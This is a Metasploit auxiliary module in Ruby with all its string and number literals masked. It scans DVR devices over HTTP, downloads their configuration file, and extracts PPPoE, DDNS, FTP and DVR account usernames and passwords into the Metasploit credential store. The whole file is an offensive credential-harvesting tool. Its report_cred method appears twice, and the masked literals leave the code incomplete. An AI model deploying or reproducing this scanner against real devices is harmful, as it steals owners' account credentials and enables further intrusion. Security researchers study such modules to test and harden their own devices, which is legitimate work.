require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: Scanner def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > MSF_LICENSE ) end def get_pppoe_credentials ( conf ) user = <str> password = <str> enabled = <str> if conf =~ <str> enabled = $1 end return if enabled == <str> if conf =~ <str> user = $1 end if conf =~ <str> password = $1 end if user . empty? or password . empty? return end info = <str> rhost <str> user <str> password <str> report_note ( { <str> = > rhost , <str> = > info , <str> = > <str> , <str> = > <str> , <str> = > <str> } ) end def get_ddns_credentials ( conf ) hostname = <str> user = <str> password = <str> enabled = <str> if conf =~ <str> enabled = $1 end return if enabled == <str> if conf =~ <str> hostname = $1 end if conf =~ <str> user = $1 end if conf =~ <str> password = $1 end if hostname . empty? return end info = <str> hostname <str> user <str> password <str> report_note ( { <str> = > rhost , <str> = > info , <str> = > <str> , <str> = > <str> , <str> = > <str> } ) end def get_ftp_credentials ( conf ) server = <str> user = <str> password = <str> port = <str> if conf =~ <str> server = $1 end if conf =~ <str> user = $1 end if conf =~ <str> password = $1 end if conf =~ <str> port = $1 end if server . empty? return end report_cred ( <str> : server , <str> : port , <str> : <str> , <str> : user , <str> : password , <str> : conf . inspect ) end def report_cred ( opts ) service_data = { <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : <str> , <str> : myworkspace_id } credential_data = { <str> : <str> , <str> : fullname , <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : <str> } . merge ( service_data ) login_data = { <str> : create_credential ( credential_data ) , <str> : Metasploit :: Model :: Login :: Status :: UNTRIED , <str> : opts [ <str> ] } . merge ( service_data ) create_credential_login ( login_data ) end def get_dvr_credentials ( conf ) conf . scan ( <str> ) . each { | match | user = <str> password = <str> active = <str> user_id = match [ <int> ] if conf =~ <str> user_id <str> active = $1 end if conf =~ <str> user_id <str> user = $1 end if conf =~ <str> user_id <str> password = $1 end if active == <str> user_active = false else user_active = true end report_cred ( <str> : rhost , <str> : rport , <str> : <str> , <str> : user , <str> : password , <str> : <str> user_id <str> active <str> ) } end def report_cred ( opts ) service_data = { <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : <str> , <str> : myworkspace_id } credential_data = { <str> : <str> , <str> : fullname , <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : <str> } . merge ( service_data ) login_data = { <str> : create_credential ( credential_data ) , <str> : Metasploit :: Model :: Login :: Status :: UNTRIED , <str> : opts [ <str> ] } . merge ( service_data ) create_credential_login ( login_data ) end def run_host ( ip ) res = send_request_cgi ( { <str> = > <str> , <str> = > <str> } ) if not res or res . code != <int> or res . body . empty? or res . body !~ <str> vprint_error ( <str> rhost <str> rport <str> ) return end p = store_loot ( <str> , <str> , rhost , res . body , <str> ) vprint_good ( <str> rhost <str> rport <str> p <str> ) conf = res . body get_ftp_credentials ( conf ) get_dvr_credentials ( conf ) get_ddns_credentials ( conf ) get_pppoe_credentials ( conf ) dvr_name = <str> if res . body =~ <str> dvr_name = $1 end report_service ( <str> = > rhost , <str> = > rport , <str> = > <str> , <str> = > <str> dvr_name <str> ) print_good ( <str> rhost <str> rport <str> dvr_name <str> ) end end 
